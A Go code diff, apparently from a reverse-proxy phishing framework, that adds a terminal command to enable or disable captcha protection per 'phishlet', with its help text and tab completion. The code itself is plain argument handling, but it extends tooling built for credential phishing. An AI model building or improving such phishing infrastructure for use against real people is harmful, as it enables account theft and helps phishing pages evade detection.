@@ -159,6 +159,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("telegram: %v", err)
 			}
+		case "captcha":
+			cmd_ok = true
+			err := t.handleCaptcha(args[1:])
+			if err != nil {
+				log.Error("captcha: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -361,6 +367,29 @@ func (t *Terminal) handleTelegram(args []string) error {
 				}
 			} else {
 				log.Error("telegram: webhook URL or chat ID not configured")
+			}
+			return nil
+		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleCaptcha(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		return fmt.Errorf("missing arguments: captcha <phishlet> <enable|disable>")
+	} else if pn == 2 {
+		switch args[1] {
+		case "enable":
+			err := t.cfg.EnableCaptcha(args[0], true)
+			if err != nil {
+				return err
+			}
+			return nil
+		case "disable":
+			err := t.cfg.EnableCaptcha(args[0], false)
+			if err != nil {
+				return err
 			}
 			return nil
 		}
@@ -1309,6 +1338,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("telegram", []string{"enable"}, "enable", "enable telegram notifications")
 	h.AddSubCommand("telegram", []string{"disable"}, "disable", "disable telegram notifications")
 	h.AddSubCommand("telegram", []string{"test"}, "test", "send a test message to telegram")
+
+	h.AddCommand("captcha", "general", "manage captcha protection", "Enable or disable captcha protection for phishlets.", LAYER_TOP,
+		readline.PcItem("captcha", readline.PcItemDynamic(t.phishletPrefixCompleter), readline.PcItem("enable"), readline.PcItem("disable")))
+
+	h.AddSubCommand("captcha", []string{"enable"}, "captcha <phishlet> enable", "enable captcha protection for the specified phishlet")
+	h.AddSubCommand("captcha", []string{"disable"}, "captcha <phishlet> disable", "disable captcha protection for the specified phishlet")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
